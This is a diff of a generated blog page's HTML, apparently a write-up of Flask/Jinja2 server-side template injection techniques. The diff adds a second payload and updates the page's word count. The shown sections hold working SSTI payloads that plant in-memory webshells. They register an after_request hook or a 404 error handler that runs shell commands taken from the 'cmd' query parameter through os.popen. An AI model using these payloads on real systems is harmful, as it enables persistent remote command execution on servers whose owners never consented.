@@ -207,14 +207,14 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">Word count in article: </span>
-      <span>929</span>
+      <span>965</span>
     </span>
     <span class="post-meta-item" title="Reading time">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">Reading time &asymp;</span>
-      <span>3 mins.</span>
+      <span>4 mins.</span>
     </span>
 </div>
 
@@ -265,6 +265,9 @@
 
 <h3 id="after-request-funcs-setdefault"><a href="#after-request-funcs-setdefault" class="headerlink" title="after_request_funcs.setdefault"></a>after_request_funcs.setdefault</h3><p>webshell	&#x2F;?cmd&#x3D;</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#x27;cmd&#x27;) and exec(\&quot;global CmdResp;CmdResp=__import__(&#x27;flask&#x27;).make_response(__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read())\&quot;)==None else resp)&quot;</span>,&#123;<span class="string">&#x27;request&#x27;</span>:url_for.__globals__[<span class="string">&#x27;request&#x27;</span>],<span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>payload2</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;flask&#x27;).current_app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if __import__(&#x27;flask&#x27;).request.args.get(&#x27;cmd&#x27;) and exec(\&quot;global CmdResp;CmdResp=__import__(&#x27;flask&#x27;).make_response(__import__(&#x27;os&#x27;).popen(__import__(&#x27;flask&#x27;).request.args.get(&#x27;cmd&#x27;)).read())\&quot;)==None else resp)&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
 
 <h3 id="error-handler-spec"><a href="#error-handler-spec" class="headerlink" title="error_handler_spec"></a>error_handler_spec</h3><p>404webshell	&#x2F;404page?cmd&#x3D;</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;exec&#x27;</span>](<span class="string">&quot;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda e:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read()&quot;</span>, &#123;<span class="string">&#x27;request&#x27;</span>:url_for.__globals__[<span class="string">&#x27;request&#x27;</span>],<span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure>
